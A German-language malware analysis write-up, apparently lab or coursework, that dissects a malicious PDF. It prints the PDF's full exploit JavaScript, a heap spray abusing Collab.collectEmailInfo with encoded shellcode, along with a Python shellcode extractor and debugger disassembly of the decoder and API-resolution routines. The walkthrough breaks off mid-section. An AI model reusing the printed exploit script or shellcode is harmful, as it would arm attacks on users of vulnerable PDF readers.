# SurveyOnObama.bin Dateianalyse

## 1. Dateityp-Identifikation

Der Befehl `file SurveyOnObama.bin` wurde im Terminal unter Ubuntu Subsystem ausgeführt. Die Ausgabe war:

```bash
SurveyOnObama.bin: PDF document, version 1.5
```

Das bedeutet, dass die Datei vom Typ **PDF** ist.


## 2. Verwendung von pdf-parser.py

Für die Analyse wird das Tool `pdf-parser.py` benötigt, das von GitHub heruntergeladen werden kann:

https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py

Nach dem Herunterladen des Tools wird im Terminal folgender Befehl ausgeführt:

```bash
python pdf-parser.py -f -a SurveyOnObama.bin
```

### Erklärung der Optionen:

- `-f`, `--filter`: wendet automatische Dekompression an (FlateDecode, ASCIIHexDecode, ASCII85Decode, LZWDecode und RunLengthDecode)
- `-a`, `--stats`: zeigt statistische Informationen über die PDF-Dokumentstruktur an

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
Comment: 146
XREF: 8
Trailer: 8
StartXref: 4
Indirect object: 52
Indirect objects with a stream: 25, 26, 27, 19, 24, 33, 31, 32, 25, 26, 27, 19, 24, 33, 31, 32
  24: 2, 3, 6, 9, 11, 14, 19, 6, 28, 29, 30, 31, 2, 3, 6, 9, 11, 14, 19, 6, 28, 29, 30, 31
 /Catalog 4: 16, 16, 16, 16
 /ExtGState 2: 22, 22
 /Font 2: 20, 20
 /FontDescriptor 2: 21, 21
 /Metadata 4: 24, 32, 24, 32
 /ObjStm 4: 25, 26, 25, 26
 /Page 4: 18, 18, 18, 18
 /Pages 2: 4, 4
 /XRef 4: 27, 33, 27, 33
Unreferenced indirect objects: 9 0 R, 11 0 R, 25 0 R, 26 0 R, 27 0 R, 28 0 R, 33 0 R
Unreferenced indirect objects without /ObjStm objects: 9 0 R, 11 0 R, 27 0 R, 28 0 R, 33 0 R
Search keywords:
 /JS 2: 29, 29
 /JavaScript 2: 29, 29
 /AA 2: 18, 18
```

=> Das Ergebnis zeigte, dass die Datei JavaScript enthält und Aktionen automatisch ausführen kann


## 3. Analyse von Objekt 29 (JavaScript-Verweis)

Anschließend wurde Objekt 29 näher betrachtet, da es sich um einen möglichen JavaScript-Verweis handelt. Zur Analyse wurde folgender Befehl ausgeführt:

```bash
python pdf-parser.py -o 29 SurveyOnObama.bin
```

### Erklärung der Option:

- `-o`, `--objstm`: analysiert den Inhalt eines bestimmten Objekt-Streams (z. B. JavaScript, eingebettete Streams)

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 29 0
 Type:
 Referencing: 31 0 R

  <<
    /S /JavaScript
    /JS 31 0 R
  >>


obj 29 0
 Type:
 Referencing: 31 0 R

  <<
    /S /JavaScript
    /JS 31 0 R
  >>
```

=> Man sieht, dass es auf Objekt 31 verweist


## 4. Analyse von Objekt 18 (Seite mit automatischer Aktion)

Anschließend wurde Objekt 18 untersucht, da es sich um die Seite handelt, auf der eine automatische Aktion definiert ist. Der dabei verwendete Befehl lautet:

```bash
python pdf-parser.py -o 18 SurveyOnObama.bin
```

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /StructParents 0
  >>


obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R, 29 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /AA
      <<
        /O 29 0 R
      >>
    /StructParents 0
  >>


obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /StructParents 0
  >>


obj 18 0
 Type: /Page
 Referencing: 19 0 R, 4 0 R, 20 0 R, 22 0 R, 29 0 R

  <<
    /Contents 19 0 R
    /Type /Page
    /Parent 4 0 R
    /Rotate 0
    /MediaBox [0 0 595 842]
    /CropBox [0 0 595 842]
    /Resources
      <<
        /Font
          <<
            /TT0 20 0 R
          >>
        /ProcSet [/PDF/Text]
        /ExtGState
          <<
            /GS0 22 0 R
          >>
      >>
    /AA
      <<
        /O 29 0 R
      >>
    /StructParents 0
  >>
```

=> Man sieht die `/AA /O`-Aktion, die Objekt 29 aufruft.


## 5. Analyse von Objekt 31 (JavaScript-Inhalt)

Anschließend wurde die Struktur von Objekt 31 mit folgendem Befehl geprüft :

```bash
python pdf-parser.py -o 31 SurveyOnObama.bin
```

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>


obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>
```

=> Man sieht, dass es einen komprimierten Stream enthält (`/Filter [/FlateDecode]`).


## 6. Extraktion und Dekompression des JavaScript-Codes

Abschließend wurde der JavaScript-Code aus Objekt 31 extrahiert und dekomprimiert. Der verwendete Befehl lautet:

```bash
python pdf-parser.py -o 31 -f SurveyOnObama.bin
```

Die Ausgabe war:
```bash
This program has not been tested with this version of Python (3.13.3)
Should you encounter problems, please use Python version 3.12.2
obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>

 b'function re(count,what) \r\n{\r\nvar v = "";\r\nwhile (--count >= 0) \r\nv += what;\r\nreturn v;\r\n} \r\nfunction sopen() \r\n{\r\nsc = unescape("%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");\r\nif (app.viewerVersion >= 7.0)\r\n{\r\nplin = re(1124,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%uFCFC%uFCFC") + re(120,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%uFCFC%uFCFC") + sc + re(1256,unescape("%u6161%u6161"));\r\n} \r\nelse \r\n{\r\nef6 =  unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");\r\nplin = re(80,unescape("%uFCFC%uFCFC")) + sc + re(80,unescape("%uFCFC%uFCFC"))+ unescape("%u17e9%ufffb")+unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");\r\nwhile ((plin.length % 8) != 0) \r\nplin = unescape("%u6161") + plin;\r\nplin += re(2626,ef6);\r\n}\r\nif (app.viewerVersion >= 6.0)\r\n{\r\nthis.collabStore = Collab.collectEmailInfo({subj: "",msg: plin});\r\n}\r\n}\r\nvar shaft = app.setTimeOut("sopen()",1200);'

obj 31 0
 Type:
 Referencing: 30 0 R
 Contains stream

  <<
    /Length 30 0 R
    /Filter [/FlateDecode]
  >>

 b'function re(count,what) \r\n{\r\nvar v = "";\r\nwhile (--count >= 0) \r\nv += what;\r\nreturn v;\r\n} \r\nfunction sopen() \r\n{\r\nsc = unescape("%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");\r\nif (app.viewerVersion >= 7.0)\r\n{\r\nplin = re(1124,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%uFCFC%uFCFC") + re(120,unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%uFCFC%uFCFC") + sc + re(1256,unescape("%u6161%u6161"));\r\n} \r\nelse \r\n{\r\nef6 =  unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");\r\nplin = re(80,unescape("%uFCFC%uFCFC")) + sc + re(80,unescape("%uFCFC%uFCFC"))+ unescape("%u17e9%ufffb")+unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");\r\nwhile ((plin.length % 8) != 0) \r\nplin = unescape("%u6161") + plin;\r\nplin += re(2626,ef6);\r\n}\r\nif (app.viewerVersion >= 6.0)\r\n{\r\nthis.collabStore = Collab.collectEmailInfo({subj: "",msg: plin});\r\n}\r\n}\r\nvar shaft = app.setTimeOut("sopen()",1200);'


```

=> Der JavaScript-Code verwendet `unescape()` und eine Funktion `re()` zum Dekodieren von Shellcode, der in Unicode-Zeichen versteckt ist. Am Ende wird der Code mit `app.setTimeOut("sopen", 1200)` ausgeführt.

## 7. Extraktion des Shellcodes aus JavaScript

Zur Extraktion des Shellcodes wird ein Python-Skript verwendet, das die `%uXXXX`-Werte in rohe Bytes umwandelt. Das Ergebnis wird in einer Datei `shellcode_extracted.bin` gespeichert.

### Dateiname: `extract_shellcode.py`

```python
import re

# Raw JavaScript shellcode in %uXXXX format
data = '''%uc933%ub966%u017c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f62%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6259%u6d64%u6f61%u6667%u7067%u6767%u6b61%u6668%u6760%u6459%u625d%u6561%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5e%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f'''

shellcode = b""

# Extract %uXXXX pairs using regex
matches = re.findall(r"%u([0-9a-fA-F]{4})", data)

for match in matches:
    # Convert to bytes in little-endian format
    bytes_le = bytes.fromhex(match)
    shellcode += bytes([bytes_le[1], bytes_le[0]])

# Write the decoded shellcode to a binary file
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
```

Nach dem Ausführen dieses Skripts mit:

```bash
python extract_shellcode.py
```

=> Dadurch wurde die Datei `shellcode.bin` erzeugt


## 8. Umwandlung des Shellcodes in eine ausführbare Datei

Zur Durchführung einer dynamischen Analyse mit `x32dbg` muss der Shellcode in eine `.exe`-Datei umgewandelt werden. Hierfür wird das Tool `shcode2exe` verwendet, das auf GitHub verfügbar ist :

 https://github.com/accidentalrebel/shcode2exe/blob/master/shcode2exe.py

Nach dem Herunterladen des Skripts wird folgender Befehl ausgeführt :

```bash
python shcode2exe.py -o full_sc.exe shellcode.bin
```

=> Dabei wird eine Datei mit dem Namen `full_sc.exe` erzeugt, die anschließend mit Debugging-Tools (`x32dbg`) analysiert werden kann.


# Dynamische Analyse mit x32dbg

## 1. Vorbereitung der Ausführung – EIP setzen

Nach dem Laden der Datei `full_sc.exe` im Debugger landet der Initialwert des EIP-Registers auf folgender Adresse:

```
EIP = 7C91120F
```

Diese Adresse liegt im Speicherbereich der `ntdll.dll` und nicht im eigentlichen Codeabschnitt des Programms. Zur Analyse der tatsächlichen Ausführung des Malware-Codes wird der EIP manuell auf den Original-Entry-Point gesetzt :
```
EIP → 00401000
```

### 1.1 Speicherrechte setzen

Vor der Ausführung des Codes an Adresse `00401000` ist sicherzustellen, dass der entsprechende Speicherbereich über die erforderlichen Zugriffsrechte verfügt. Die Rechte werden wie folgt gesetzt:
```
→ Rechtsklick im Memory Map (00401000) → Set Page Memory Rights → Full Access (R/W/X)
```

Dies ermöglicht das Lesen, Schreiben und Ausführen des Codes im angegebenen Speicherbereich.

## 2. Parameter vorbereiten

Nach dem Setzen des EIP auf `00401000` wird der Code schrittweise mit **Step Over (F8)** ausgeführt, bis die folgenden Anweisungen erreicht werden
```
00401020 | 6A 00              | push 0
00401022 | 68 80000000        | push 80
00401027 | 6A 03              | push 3
00401029 | 6A 00              | push 0
0040102B | 6A 01              | push 1
0040102D | 68 00000080        | push 80000000
00401032 | 68 02104000        | push full_sc.401002 → "C:\sc.pdf"
00401037 | E8 D5DA7476        | call 76B4EB11
```

### 2.1 Analyse des Aufrufs bei 00401037

Man beobachtet, dass bei Adresse `00401037` ein Aufruf an `76B4EB11` erfolgt. Dieser ist falsch und muss durch einen direkten Aufruf von `CreateFileA` ersetzt werden.

```c
HANDLE CreateFileA(
  [in]           LPCSTR                lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);
```

## 3. Payload entschlüsseln

Nach dem Aufruf kehrt die Ausführung zum folgenden Code zurück, wo eine Dekodierschleife beginnt:

```
00401048 | 5E              | pop esi
00401049 | 56              | push esi
0040104A | 8BFE            | mov edi, esi
0040104C | AC              | lodsb
0040104D | 66:2D 6100      | sub ax, 0061h
00401051 | 66:C1E0 04      | shl ax, 4
00401055 | 66:8BD0         | mov dx, ax
00401058 | AC              | lodsb
00401059 | 2C 61           | sub al, 61h
0040105B | 66:03C2         | add ax, dx
0040105E | AA              | stosb
0040105F | 49              | dec ecx
00401060 | 75 EA           | jne 0040104C
00401062 | C3              | ret
00401063 | E8 E0FFFFFF     | call 00401048
```

### 3.1 Wichtiger Hinweis zur Schleife

Die Schleife im Bereich zwischen `0040104C` und `00401060` dient der Dekodierung des Payloads. Um eine manuelle Ausführung dieser Schleife zu vermeiden, wird **ein Breakpoint an Adresse `00401068`** gesetzt – unmittelbar nach dem `call 00401048` :

```
00401068 | 55              | push ebp
```

Danach wird die Ausführung mit **F9 (Run)** fortgesetzt. Dies ermöglicht es, die vollständige Entschlüsselung des Payloads automatisch durchzuführen und danach mit der Analyse des entschlüsselten Codes fortzufahren.

## 4. API-Adressen finden

Nach erfolgreicher Entschlüsselung folgt ein Abschnitt, der die Adressen von wichtigen Windows-APIs dynamisch auflöst. Der komplette Codeabschnitt sieht folgendermaßen aus:

```
00401068 | 55                       | push ebp
00401069 | 8BEC                     | mov ebp,esp
0040106B | 83EC 5C                  | sub esp,5C
0040106E | 53                       | push ebx
0040106F | 56                       | push esi
00401070 | 57                       | push edi
00401071 | C745 F0 11000000         | mov dword ptr ss:[ebp-10],11
00401078 | E9 1E010000              | jmp full_sc.40119B
0040107D | 8F45 FC                  | pop dword ptr ss:[ebp-4]
00401080 | 64:A1 30000000           | mov eax,dword ptr fs:[30]
00401086 | 8B40 0C                  | mov eax,dword ptr ds:[eax+C]
00401089 | 8B70 1C                  | mov esi,dword ptr ds:[eax+1C]
0040108C | AD                       | lodsd
0040108D | 8B58 08                  | mov ebx,dword ptr ds:[eax+8]
00401090 | 895D EC                  | mov dword ptr ss:[ebp-14],ebx
00401093 | 8B4D F0                  | mov ecx,dword ptr ss:[ebp-10]
00401096 | 8B7D FC                  | mov edi,dword ptr ss:[ebp-4]
00401099 | 51                       | push ecx
0040109A | 8B45 EC                  | mov eax,dword ptr ss:[ebp-14]
0040109D | 8B70 3C                  | mov esi,dword ptr ds:[eax+3C]
004010A0 | 8B7406 78                | mov esi,dword ptr ds:[esi+eax+78]
004010A4 | 03F0                     | add esi,eax
004010A6 | 56                       | push esi
004010A7 | 8B76 20                  | mov esi,dword ptr ds:[esi+20]
004010AA | 03F0                     | add esi,eax
004010AC | 33C9                     | xor ecx,ecx
004010AE | 49                       | dec ecx
004010AF | 41                       | inc ecx
004010B0 | AD                       | lodsd
004010B1 | 0345 EC                  | add eax,dword ptr ss:[ebp-14]
004010B4 | 33DB                     | xor ebx,ebx
004010B6 | 0FBE10                   | movsx edx,byte ptr ds:[eax]
004010B9 | 3AD6                     | cmp dl,dh
004010BB | 74 08                    | je full_sc.4010C5
004010BD | C1CB 0D                  | ror ebx,0D
004010C0 | 03DA                     | add ebx,edx
004010C2 | 40                       | inc eax
004010C3 | EB F1                    | jmp full_sc.4010B6
004010C5 | 3B1F                     | cmp ebx,dword ptr ds:[edi]
004010C7 | 75 E6                    | jne full_sc.4010AF
004010C9 | 5E                       | pop esi
004010CA | 8B5E 24                  | mov ebx,dword ptr ds:[esi+24]
004010CD | 035D EC                  | add ebx,dword ptr ss:[ebp-14]
004010D0 | 66:8B0C4B                | mov cx,word ptr ds:[ebx+ecx*2]
004010D4 | 8B5E 1C                  | mov ebx,dword ptr ds:[esi+1C]
004010D7 | 035D EC                  | add ebx,dword ptr ss:[ebp-14]
004010DA | 8B048B                   | mov eax,dword ptr ds:[ebx+ecx*4]
004010DD | 0345 EC                  | add eax,dword ptr ss:[ebp-14]
004010E0 | AB                       | stosd
004010E1 | 59                       | pop ecx
004010E2 | E2 B5                    | loop full_sc.401099
```
 
Dieser Code implementiert eine Schleife, die:
  - über einen Speicherbereich iteriert, der Hashes von Ziel-API-Namen enthält,
  - die exportierten Funktionen einer geladenen DLL durchläuft,
  - von jedem Funktionsnamen den Hash berechnet,
  - diesen mit dem Ziel-Hash vergleicht,
  - bei Übereinstimmung die Adresse der passenden API speichert.
    
## 5. Dateigröße ermitteln

Nach der dynamischen Auflösung der APIs wird im nächsten Schritt die Funktion `GetFileSize` indirekt über einen Funktionszeiger aufgerufen. Die relevante Code-Sektion beginnt ab Adresse `004010E4`:

```
004010E4 | 33C0               | xor eax, eax
004010E6 | 8945 E8            | mov dword ptr ss:[ebp-18], eax
004010E9 | 8945 E4            | mov dword ptr ss:[ebp-1C], eax
004010EC | 8345 E4 04         | add dword ptr ss:[ebp-1C], 4
004010F0 | 6A 00              | push 0                       ; lpFileSizeHigh = NULL
004010F2 | 8B45 E4            | mov eax, dword ptr ss:[ebp-1C]
004010F5 | 50                 | push eax                    ; hFile
004010F6 | 8B4D FC            | mov ecx, dword ptr ss:[ebp-4]
004010F9 | FF51 10            | call dword ptr ds:[ecx+10]  ; indirekter Aufruf → GetFileSize
```

Diese Aufrufweise mit call [ecx+10h] deutet stark darauf hin, dass es sich um einen Aufruf der API GetFileSize handelt. Die Parameter passen exakt zur Signatur:
``` 
DWORD GetFileSize(
  HANDLE  hFile,
  LPDWORD lpFileSizeHigh
);
```
Die Analyse per Step Over (F8) zeigt, dass der Malware-Code mehrere Versuche durchführt, um eine gültige Dateigröße zu ermitteln. Bei insgesamt 7 Ausführungen der Instruktion 004010F9, wurde der Rückgabewert EAX einmal 0x00000000, dann 0xFFFFFFFF, und schließlich ein stabiler Wert EAX = 0x000120A9 festgestellt, was einer Dateigröße von 73897 Bytes entspricht.
Diese Datei ist vermutlich der verschlüsselte Payload (sc.pdf) und dient als Grundlage für die nächsten Verarbeitungsschritte.

## 6. Speicherreservierung mit VirtualAlloc

Direkt im Anschluss wird folgender Code ausgeführt:

```
00401110 | 6A 40              | push 40
00401112 | 68 00100000        | push 1000
00401117 | 8B55 F4            | mov edx,dword ptr ss:[ebp-C]
0040111A | 52                 | push edx
0040111B | 6A 00              | push 0
0040111D | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]
00401120 | FF50 34            | call dword ptr ds:[eax+34]
```

Dies entspricht einem indirekten Aufruf der Windows-API `VirtualAlloc` mit den folgenden Parametern:

```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,             // = NULL (vom System zugewiesen)
